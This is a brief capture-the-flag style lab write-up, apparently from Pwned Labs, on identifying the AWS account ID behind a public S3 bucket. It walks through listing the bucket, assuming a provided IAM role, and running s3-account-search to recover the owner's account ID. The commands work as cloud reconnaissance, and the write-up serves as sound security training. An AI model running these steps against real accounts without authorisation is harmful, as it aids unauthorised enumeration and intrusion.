Identify the AWS Account ID from a Public S3 Bucket

Target IP: 54.204.171.32 Goal: Identify the Account ID of the target bucket owner. Info: Lab provided credentials that where set with the profile pwnedlabs. Moreover, the role ARN arn:aws:iam::427648302155:role/LeakyBucket was provided as additional info.

Retrieve the bucket name from the resources used in the target website:

Bucket is: mega-big-tech.

Try listing bucket content with pwnedlabs profile:

aws s3 ls s3://mega-big-tech --recursive --profile pwnedlabs

Try assuming the provided role with pwnedlabs profile:

aws sts assume-role --role-arn arn:aws:iam::427648302155:role/LeakyBucket --role-session-name pwnedlabs --profile pwnedlabs

Check the role has at least one between s3:getObject and s3:ListBucket; following to check if the latter permission is granted using temporary credentials from previous command:

aws s3 ls s3://mega-big-tech/ --recursive --profile tmpcreds

Having the possibility to assume the role arn:aws:iam::427648302155:role/LeakyBucket that has s3:ListBucket permissions, it's possible to recover the Account ID of the owner of the bucket:

s3-account-search --profile pwnedlabs arn:aws:iam::427648302155:role/LeakyBucket s3://mega-big-tech

Account ID is: 107513503799.
